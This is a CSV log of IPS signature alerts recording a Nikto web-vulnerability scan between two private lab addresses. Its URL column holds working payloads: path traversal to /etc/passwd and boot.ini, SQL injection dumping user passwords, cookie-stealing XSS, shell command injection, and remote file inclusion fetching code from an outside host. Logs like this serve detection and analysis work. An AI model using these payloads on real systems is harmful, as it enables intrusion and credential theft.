attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
10604,7613642,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\boot.ini
43336,7613642,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,///etc/passwd
44780,7613642,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,///etc/hosts
10604,7613642,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,-
44780,7613643,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50898,80,ips,signature,/.cobalt/sysManage/../admin/.htaccess
43336,7613643,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50898,80,ips,signature,/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
43336,7613643,6,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50898,80,ips,signature,-
44780,7613644,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\\boot.ini
43336,7613644,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
10604,7613644,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,/index.php?page=../../../../../../../../../../boot.ini
44780,7613644,2,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,-
43336,7613644,25,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,-
10604,7613644,7,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,-
10604,7613645,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,/.../.../.../.../.../.../.../.../.../boot.ini
43336,7613645,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,/................../etc/passwd
44780,7613645,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,/%3f.jsp
10604,7613645,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,-
43336,7613646,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50904,80,ips,signature,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
44780,7613647,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,/%00
10604,7613647,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,/ca//\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\windows/\\\\win.ini
43336,7613647,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,/ca/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\/\\\\etc/\\\\passwd
44780,7613647,3,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,-
10604,7613647,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,-
43336,7613647,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,-
43336,7613648,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50908,80,ips,signature,"/site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html"
15621,7613649,1,high,HTTP.URI.SQL.Injection,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,"/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
44780,7613649,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
17702,7613649,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>
10574,7613649,1,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,/<script>alert('Vulnerable')</script>.shtm
15621,7613649,2,high,HTTP.URI.SQL.Injection,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,-
44780,7613649,10,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,-
17702,7613649,64,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,-
10574,7613649,4,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,-
17702,7613650,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50912,80,ips,signature,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
44780,7613650,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50912,80,ips,signature,/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
17702,7613650,57,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50912,80,ips,signature,-
44780,7613650,7,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50912,80,ips,signature,-
17702,7613651,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50914,80,ips,signature,/index.php?file=Liens&op=\\\
17702,7613651,3,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50914,80,ips,signature,-
17702,7613652,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50916,80,ips,signature,/index.php/\\\
44780,7613652,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50916,80,ips,signature,/forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22
17702,7613652,10,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50916,80,ips,signature,-
17702,7613653,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50918,80,ips,signature,/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>
17702,7613653,13,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50918,80,ips,signature,-
17702,7613654,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50920,80,ips,signature,/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\\\
17702,7613654,8,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50920,80,ips,signature,-
17702,7613655,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50922,80,ips,signature,/article.cfm?id=1'<script>alert(document.cookie);</script>
44780,7613655,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50922,80,ips,signature,/anthill/login.php
17702,7613655,2,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50922,80,ips,signature,-
17702,7613656,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
10574,7613656,1,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,/a?<script>alert('Vulnerable')</script>
44780,7613656,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,/add_user.php
43336,7613656,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,/cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download
17702,7613656,9,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,-
10574,7613656,7,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,-
44780,7613656,42,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,-
44780,7613657,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/cgi-bin/webdist.cgi
12577,7613657,1,critical,Cisco.Command.Execution,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/exec/show/config/cr
15221,7613657,1,medium,LiteSpeed.Web.Server.NullByte.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/ext.ini.%00.txt
12699,7613657,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/achievo/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
43336,7613657,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/perl/-e%20%22system('cat%20/etc/passwd');\\%22
10574,7613657,1,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/<script>alert('Vulnerable')</script>
12909,7613657,1,medium,Doctodep.btr.Access,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/_vti_pvt/doctodep.btr
44780,7613657,94,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,-
12699,7613657,5,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,-
44780,7613658,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,/_vti_bin/_vti_aut/fp30reg.dll?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
17702,7613658,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,/mailman/admin/ml-name?\\\
12699,7613658,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,/photo_album/apa_phpinclude.inc.php?apa_module_basedir=http://cirt.net/rfiinc.txt?
10604,7613658,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,/file/../../../../../../../../etc/
44780,7613658,33,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,-
17702,7613658,9,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,-
44780,7613659,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,/level/16/exec/-///pwd
12699,7613659,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,/gallery/captionator.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?
29261,7613659,1,medium,WS_FTP.Sensitive.File.Access,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,/WS_FTP.LOG
43336,7613659,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,/basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu
44780,7613660,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/examples/jsp/snp/snoop.jsp
44780,7613659,94,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,-
12699,7613659,3,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,-
10604,7613660,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc
17702,7613660,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/index.php?err=3&email=\\\
15463,7613660,1,high,PHP.URI.Code.Injection,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
10181,7613660,1,high,phpBB.Viewtopic.Highlight.Remote.Code.Execution,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
43336,7613660,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/cgi-bin/pfdisplay.cgi?../../../../../../etc/passwd
12933,7613660,1,medium,ExAir.Search.ASP.Access,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/iissamples/exair/search/search.asp
44780,7613660,20,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,-
10604,7613660,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,-
17702,7613660,5,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,-
15463,7613660,52,high,PHP.URI.Code.Injection,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,-
10181,7613660,13,high,phpBB.Viewtopic.Highlight.Remote.Code.Execution,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,-
44780,7613661,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/
13056,7613661,1,low,Fpcount.Access,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/_vti_bin/fpcount.exe/
17702,7613661,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
13116,7613661,1,low,IISsamples.ISSamples.Access,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/iissamples/issamples/oop/qfullhit.htw?CiWebHitsFile=/iissamples/issamples/oop/qfullhit.htw&CiRestriction=none&CiHiliteType=Full
12758,7613661,1,low,MS.IIS.IndexServer.Disclosure,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHiliteType=Full
10604,7613661,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini
43336,7613661,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd
44780,7613661,37,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,-
17702,7613661,6,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,-
13116,7613661,1,low,IISsamples.ISSamples.Access,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,-
10604,7613661,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,-
10604,7613662,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50936,80,ips,signature,/../../../../../../../../../etc/passw*
10604,7613663,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/bytehoard/index.php?infolder=../../../../../../../../../../../etc/
44780,7613663,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/Search
17702,7613663,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/index.php?vo=\\\
43336,7613663,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/.../.../.../.../.../.../.../.../.../.../etc/passwd
10604,7613663,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,-
44780,7613663,4,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,-
12709,7613664,1,low,MS.IIS.IISadmpwd.HTR.File.Access.Security.Bypass,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,/iisadmpwd/aexp2.htr
44780,7613664,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,//admin/aindex.htm
17702,7613664,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>
12709,7613664,4,low,MS.IIS.IISadmpwd.HTR.File.Access.Security.Bypass,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,-
17702,7613664,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,-
44780,7613665,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50942,80,ips,signature,/admin/wg_user-info.ml
17702,7613665,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,50942,80,ips,signature,/showmail.pl?Folder=<script>alert(document.cookie)</script>
12933,7613665,1,medium,ExAir.Search.ASP.Access,HTTP,172.16.1.2,172.16.2.2,50942,80,ips,signature,/iissamples/exair/search/query.asp
44780,7613665,98,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50942,80,ips,signature,-
44780,7613666,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50944,80,ips,signature,/console
44780,7613666,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50944,80,ips,signature,-
